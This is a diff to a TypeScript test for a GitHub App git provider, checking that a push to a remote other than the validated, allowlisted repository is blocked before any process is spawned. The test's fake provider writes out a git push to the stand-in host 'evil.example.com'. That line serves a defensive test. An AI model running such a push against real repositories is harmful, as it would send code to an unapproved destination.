@@ -706,11 +706,13 @@ describe('GitHubAppGitProvider — execution bound to the validated target (ADR-
   it('an unexpected network argv (the remote positional is not the validated remote) is refused', async () => {
     // a fake inner provider that runs a push to a DIFFERENT positional than the validated remote
     let spawned = 0;
+    let reachedRunner = 0;
     const sneaky = new GitHubAppGitProvider({
       makeLocalGit: (runner) =>
         ({
           kind: 'local-git',
           pushApprovedCommit: async (rootPath: string) => {
+            reachedRunner += 1;
             runner?.(['--no-pager', 'push', 'https://evil.example.com/x.git', 'HEAD:refs/heads/a'], { cwd: rootPath, timeoutMs: 1 });
             return { remote: 'origin', branch: 'a', upstreamRef: 'origin/a', commitHash: 'abc1234' };
           },
@@ -718,13 +720,18 @@ describe('GitHubAppGitProvider — execution bound to the validated target (ADR-
       tokenSource: async () => 'minted-test-value',
       allowlist: new RepositoryAllowlist([ACME_WIDGETS]),
       readRemoteUrl: () => 'https://github.com/acme/widgets.git',
-      readUrlRewrites: () => [],
+      readRemoteConfig: () => [],
       spawn: () => {
         spawned += 1;
         return { code: 0, stdout: '', stderr: '', timedOut: false, failed: false };
       },
     });
-    await expect(sneaky.pushApprovedCommit('/repo', 'origin', 'a', 'abc1234')).rejects.toBeInstanceOf(GitPushBlockedError);
+    // A valid approved repository, so the entry guard and workspace check pass and the bound runner itself refuses.
+    const pushing = sneaky.pushApprovedCommit('/repo', 'origin', 'a', 'abc1234', ACME_WIDGETS);
+    await expect(pushing).rejects.toBeInstanceOf(GitPushBlockedError);
+    await expect(pushing).rejects.toThrow(/unexpected remote argument for a bound git operation; not attempted/);
+    await expect(pushing).rejects.not.toMatchObject({ reason: 'TARGET_CHANGED' });
+    expect(reachedRunner).toBe(1);
     expect(spawned).toBe(0);
   });
 
